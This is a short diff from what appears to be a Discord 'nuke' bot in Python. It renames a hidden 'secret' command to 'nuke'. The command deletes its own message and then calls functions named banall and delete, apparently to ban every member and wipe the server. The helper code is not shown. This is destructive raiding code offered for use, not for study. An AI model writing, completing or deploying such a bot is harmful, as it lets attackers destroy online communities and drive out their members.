@@ -57,8 +57,8 @@ if option == '1':
         print(f"Im logged in {bot.user}")
         print(f"Corre el comando Nuke")
         
-    @bot.command(name="secret")
-    async def secret(ctx):
+    @bot.command(name="nuke")
+    async def nuke(ctx):
         await ctx.message.delete()
         await banall(ctx)
         await delete(ctx)
